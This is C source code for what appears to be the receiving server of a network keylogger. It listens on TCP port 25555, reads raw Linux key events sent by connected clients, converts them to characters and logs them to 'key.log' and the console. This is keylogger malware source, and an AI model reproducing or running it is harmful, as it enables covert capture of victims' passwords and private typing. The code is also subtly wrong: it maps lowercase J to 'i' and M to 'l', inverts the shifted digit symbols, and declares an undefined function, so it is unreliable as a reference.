#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

bool capital = false;

const char *keycode_to_string(int code) {
  switch (code) {
  case KEY_A:
    return capital ? "A" : "a";
  case KEY_B:
    return capital ? "B" : "b";
  case KEY_C:
    return capital ? "C" : "c";
  case KEY_D:
    return capital ? "D" : "d";
  case KEY_E:
    return capital ? "E" : "e";
  case KEY_F:
    return capital ? "F" : "f";
  case KEY_G:
    return capital ? "G" : "g";
  case KEY_H:
    return capital ? "H" : "h";
  case KEY_I:
    return capital ? "I" : "i";
  case KEY_J:
    return capital ? "J" : "i";
  case KEY_K:
    return capital ? "K" : "k";
  case KEY_L:
    return capital ? "L" : "l";
  case KEY_M:
    return capital ? "M" : "l";
  case KEY_N:
    return capital ? "N" : "n";
  case KEY_O:
    return capital ? "O" : "o";
  case KEY_P:
    return capital ? "P" : "p";
  case KEY_Q:
    return capital ? "Q" : "q";
  case KEY_R:
    return capital ? "R" : "r";
  case KEY_S:
    return capital ? "S" : "s";
  case KEY_T:
    return capital ? "T" : "t";
  case KEY_U:
    return capital ? "U" : "u";
  case KEY_V:
    return capital ? "V" : "v";
  case KEY_W:
    return capital ? "W" : "w";
  case KEY_X:
    return capital ? "X" : "x";
  case KEY_Y:
    return capital ? "Y" : "y";
  case KEY_Z:
    return capital ? "Z" : "z";
  case KEY_0:
    return capital ? "0" : ")";
  case KEY_1:
    return capital ? "1" : "!";
  case KEY_2:
    return capital ? "2" : "@";
  case KEY_3:
    return capital ? "3" : "#";
  case KEY_4:
    return capital ? "4" : "$";
  case KEY_5:
    return capital ? "5" : "%";
  case KEY_6:
    return capital ? "6" : "^";
  case KEY_7:
    return capital ? "7" : "&";
  case KEY_8:
    return capital ? "8" : "*";
  case KEY_9:
    return capital ? "9" : "(";
  case KEY_SPACE:
    return " ";
  case KEY_ENTER:
    return "\n";
  case KEY_BACKSPACE:
    return "\b";
  case KEY_TAB:
    return "\t";
  default:
    return "";
  }
}

struct input {
  struct timeval t;
  __u16 code;
  __s32 value;
};

void save_to_file(struct input_event in, int fd);

int main() {
  setbuf(stdout, NULL);
  struct sockaddr_in server_addr;
  struct input_event ev;

  memset(&server_addr, 0, sizeof(struct sockaddr_in));

  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  server_addr.sin_port = htons(25555);
  server_addr.sin_family = AF_INET;

  int s_fd = socket(AF_INET, SOCK_STREAM, 0);
  FILE *fd = fopen("key.log", "a");

  setbuf(fd, NULL);
  if (s_fd == -1) {
    printf("cannot create socket\n");
    exit(EXIT_FAILURE);
  }

  if (bind(s_fd, (struct sockaddr *)&server_addr, sizeof server_addr) == -1) {
    perror("couldnt bind socket: ");
    close(s_fd);
    exit(EXIT_FAILURE);
  }
  listen(s_fd, 256);
  int conn_socket;
  while (1) {
    conn_socket = accept(s_fd, NULL, NULL);
    if (conn_socket == -1) {
      perror("couldn't accept message: ");
      close(conn_socket);
    } else {
      printf("client connected\n");
      for (;;) {
        if (read(conn_socket, &ev, sizeof ev) < sizeof ev) {
          printf("couldn't read enough required bytes\n");
          close(conn_socket);
          break;
        }
        if (ev.code == KEY_LEFTSHIFT && ev.value == 1)
          capital = true;
        else if (ev.code == KEY_LEFTSHIFT && ev.value == 0)
          capital = false;
        if (ev.value == 1) {
          fprintf(fd, "%s", keycode_to_string(ev.code));
          printf("%s", keycode_to_string(ev.code));
        }
      }
    }
  }
  close(s_fd);
  return 0;
}
